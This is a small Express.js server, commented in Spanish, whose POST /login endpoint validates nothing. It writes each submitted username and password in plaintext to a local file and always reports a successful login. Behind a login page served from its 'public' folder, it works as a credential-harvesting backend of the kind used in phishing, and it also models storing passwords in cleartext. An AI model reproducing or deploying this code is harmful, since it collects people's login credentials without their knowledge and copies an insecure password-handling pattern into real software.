// Importa los módulos necesarios
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

// Crea una instancia de la aplicación Express
const app = express();
const port = 3005;

// Configura el middleware para analizar cuerpos de solicitudes en formato JSON
app.use(bodyParser.json());

// Configura el middleware para servir archivos estáticos desde la carpeta 'public'
app.use(express.static('public'));

// Define una ruta POST para el endpoint '/login'
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Validación simple
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Correo electrónico y contraseña son requeridos.' });
    }

    // Aquí puedes agregar lógica para validar las credenciales del usuario
    // Ejemplo: verificar si el usuario existe en una base de datos

    // Ejemplo de escritura en un archivo (para pruebas)
    const filePath = path.join(__dirname, 'login_data.txt');
    const logEntry = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile(filePath, logEntry, (err) => {
        if (err) {
            console.error('Error al guardar los datos:', err);
            return res.status(500).json({ success: false, message: 'Error al procesar la solicitud.' });
        }
        console.log('Datos guardados en el archivo.');
        res.json({ success: true, message: 'Inicio de sesión exitoso' });
    });
});

// Configura el servidor para escuchar en el puerto definido
app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
